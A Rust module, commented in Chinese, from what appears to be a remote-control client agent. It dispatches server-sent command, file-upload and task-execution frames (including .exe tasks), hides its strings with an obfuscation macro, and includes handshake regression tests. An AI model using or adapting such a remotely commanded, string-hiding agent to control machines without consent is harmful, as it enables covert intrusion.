//! ctrl_kik 的初始化帧、命令帧和数据帧分派。
//!
//! 网络读任务只做解析与有界投递。命令进入工作队列后由独立任务执行，上传数据按 data ID 进入私有队列；
//! 这保证慢磁盘、Exec 和乱序文件帧不会阻塞连接心跳。

use crate::cmd_runner;
use crate::context::{Context, COMMAND_SENDER};
use bytes::BytesMut;
use common::channel::Channel;
use common::command::Command;
use common::file_util::LONG_COMMAND_TIMEOUT;
use common::hidden;
use common::message::init_frame::InitFrame;
use common::message::kik_frame::KikFrame;
use common::message::kik_resp::kik_error;
use common::protocol;
use common::protocol::{BufSerializable, CmdOptions};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc::Sender;
use tokio::sync::Mutex;
use tokio::time::timeout;

fn default_error() -> anyhow::Error {
    anyhow::Error::msg(hidden!("不支持的帧类型"))
}

pub async fn handle_kik(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
) -> anyhow::Result<()> {
    let frame = KikFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        KikFrame::Task(common::task::TaskFrame::PrepareNamed {
            id,
            size,
            hash,
            spec,
            file_name,
        }) => {
            if channel
                .lock()
                .await
                .attribute(&common::task::TASK_NAMED_CACHE_CAPABLE)
                != Some(&true)
            {
                return Err(anyhow::Error::msg(hidden!("任务文件名协议尚未确认")));
            }
            crate::task_runner::dispatch(context, channel, id, size, hash, spec, file_name).await?;
        }
        KikFrame::Task(common::task::TaskFrame::AbandonTransfer(id)) => {
            crate::task_runner::abandon(&channel, &id).await;
        }
        // 只确认最终文件名协议。旧服务端的 ACK/Prepare 仍可解码，但不会解锁握手或执行。
        KikFrame::Task(common::task::TaskFrame::HelloNamedAck) => {
            let mut channel = channel.lock().await;
            if let Some(sender) = channel.attribute(&crate::kik_conn::TASK_HELLO_ACK).cloned() {
                if sender.try_send(()).is_ok() {
                    channel.insert_attribute(&common::task::TASK_NAMED_CACHE_CAPABLE, true);
                }
            }
        }
        // 命令只进入工作队列，不在读循环执行；这样慢命令不会阻塞 Ping/Pong。
        KikFrame::Cmd(req_cmd) => {
            let command = req_cmd.split();
            let upload_data_id = match &command.2 {
                Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
                | Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
                    Some(id.clone())
                }
                _ => None,
            };
            if let Some(data_id) = upload_data_id.as_deref() {
                context.register_data_route(data_id).await?;
            }
            let send_result = channel
                .lock()
                .await
                .attribute(&COMMAND_SENDER)
                .cloned()
                .ok_or_else(|| anyhow::Error::msg(hidden!("命令处理队列未初始化")))?
                .send(command)
                .await;
            if send_result.is_err() {
                if let Some(data_id) = upload_data_id.as_deref() {
                    context.remove_data_route(data_id).await;
                }
                return Err(anyhow::Error::msg(hidden!("命令处理线程已关闭")));
            }
        }
        KikFrame::Ping => {}
        KikFrame::Pong => {}
        _ => {
            return Err(default_error());
        }
    }
    Ok(())
}

/// 在独立命令任务中执行请求并写回带内部命令 ID 的响应。
pub async fn handle_kik_cmd(
    context: Context,
    channel: &Arc<Mutex<Channel>>,
    cmd_id: String,
    cmd_options: CmdOptions,
    cmd: Command,
) {
    let upload_data_id = match &cmd {
        common::command::Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
        | common::command::Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
            Some(id.clone())
        }
        _ => None,
    };
    dev_debug!("Running command: {:?}", cmd);
    let run_timeout = if cmd_options.timeout() {
        Duration::from_secs(60 * 5)
    } else {
        LONG_COMMAND_TIMEOUT
    };
    let outcome = timeout(run_timeout, cmd_runner::run(&context, cmd))
        .await
        .unwrap_or_else(|_| {
            cmd_runner::RunOutcome::immediate(kik_error(hidden!("Kik执行任务超时")))
        });
    let (resp, transfer_start) = outcome.split();
    if let Some(data_id) = upload_data_id {
        context.remove_data_route(&data_id).await;
    }
    dev_debug!("开始响应:{:?},cmd_id:{}", resp, cmd_id);
    let suc = channel
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(KikFrame::RespExtra(
            resp, cmd_id,
        )))
        .await;
    // 响应写失败说明主连接已不可信；写成功后才允许大文件生产者开始发送分片。
    if suc.is_err() {
        channel.lock().await.try_write_half_close().await;
    } else if let Some(start) = transfer_start {
        // 只有 data_id 响应成功写出后才放行大文件数据，建立明确的生产者/消费者时序。
        let _ = start.send(());
    }
    dev_debug!("响应结束");
}

pub async fn handle_kik_data(
    context: &Context,
    _channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
) -> anyhow::Result<()> {
    let frame = KikFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        KikFrame::Data(id, data) => {
            dev_debug!("得到长度为{}的数据", data.len());
            if let Err(_error) = context.send_data((id, data)).await {
                dev_debug!("向接收通道发送数据失败,error:{}", _error);
            }
        }
        KikFrame::Ping => {}
        KikFrame::Pong => {}
        _ => {
            return Err(default_error());
        }
    }
    Ok(())
}

pub async fn handle_init_message(
    _context: &Context,
    _channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
    tx: &mut Sender<String>,
) -> anyhow::Result<()> {
    // 服务端会让初始化确认先于心跳发送；即使网络重排，Unknown 阶段也只接受 InitFrame。
    let frame =
        InitFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        InitFrame::KikId(id) => {
            tx.send(id)
                .await
                .map_err(|_| anyhow::Error::msg(hidden!("初始化响应接收任务已关闭")))?;
        }
        _frame => {
            return Err(default_error());
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use common::task::{TaskCacheKey, TaskFrame, TaskSpec, TASK_NAMED_CACHE_CAPABLE};

    fn channel() -> Arc<Mutex<Channel>> {
        Arc::new(Mutex::new(Channel::new(
            Box::pin(tokio::io::sink()),
            Some("named-handshake-regression-channel".into()),
            common::channel::ChannelType::Kik,
            Err(std::io::Error::other(
                "named-handshake-test-no-local-address",
            )),
            Err(std::io::Error::other(
                "named-handshake-test-no-peer-address",
            )),
        )))
    }

    #[tokio::test]
    async fn only_named_ack_confirms_the_current_connection() {
        let context = Context::new();
        let channel = channel();
        let (sender, mut receiver) = tokio::sync::mpsc::channel(1);
        channel
            .lock()
            .await
            .insert_attribute(&crate::kik_conn::TASK_HELLO_ACK, sender);
        for old_ack in [TaskFrame::HelloAck, TaskFrame::HelloCachedAck] {
            assert!(
                handle_kik(&context, channel.clone(), KikFrame::Task(old_ack).to_buf())
                    .await
                    .is_err()
            );
            assert!(receiver.try_recv().is_err());
            assert!(channel
                .lock()
                .await
                .attribute(&TASK_NAMED_CACHE_CAPABLE)
                .is_none());
        }
        handle_kik(
            &context,
            channel.clone(),
            KikFrame::Task(TaskFrame::HelloNamedAck).to_buf(),
        )
        .await
        .unwrap();
        assert_eq!(receiver.try_recv(), Ok(()));
        assert_eq!(
            channel.lock().await.attribute(&TASK_NAMED_CACHE_CAPABLE),
            Some(&true)
        );
        // 另一个连接没有继承确认标志，避免重连后沿用旧代次的协商结果。
        assert!(self::channel()
            .lock()
            .await
            .attribute(&TASK_NAMED_CACHE_CAPABLE)
            .is_none());
    }

    #[tokio::test]
    async fn old_prepare_frames_never_execute_and_named_prepare_requires_ack() {
        let context = Context::new();
        let channel = channel();
        let spec = TaskSpec {
            asynchronous: false,
            output: false,
            timeout_seconds: 5,
            args: vec![],
            default_content: "legacy-task-prepare-rejection-regression".into(),
        };
        let frames = [
            TaskFrame::Prepare {
                id: "legacy-prepare-regression".into(),
                size: 4,
                hash: [0; 32],
                spec: spec.clone(),
            },
            TaskFrame::PrepareCached {
                id: "opaque-prepare-regression".into(),
                size: 4,
                hash: [0; 32],
                spec: spec.clone(),
                cache: TaskCacheKey {
                    id: [0; 32],
                    extension: "exe".into(),
                },
            },
            TaskFrame::PrepareNamed {
                id: "unconfirmed-named-prepare-regression".into(),
                size: 4,
                hash: [0; 32],
                spec,
                file_name: "must-not-open-before-handshake.exe".into(),
            },
        ];
        for frame in frames {
            assert!(
                handle_kik(&context, channel.clone(), KikFrame::Task(frame).to_buf())
                    .await
                    .is_err()
            );
        }
        // 旧格式即使在新协议确认后也必须拒绝，不能同时维护两种落盘执行语义。
        channel
            .lock()
            .await
            .insert_attribute(&TASK_NAMED_CACHE_CAPABLE, true);
        let old = TaskFrame::PrepareCached {
            id: "confirmed-still-rejects-opaque-prepare".into(),
            size: 4,
            hash: [0; 32],
            spec: TaskSpec {
                asynchronous: false,
                output: false,
                timeout_seconds: 5,
                args: vec![],
                default_content: String::new(),
            },
            cache: TaskCacheKey {
                id: [0; 32],
                extension: "exe".into(),
            },
        };
        assert!(handle_kik(&context, channel, KikFrame::Task(old).to_buf())
            .await
            .is_err());
    }
}
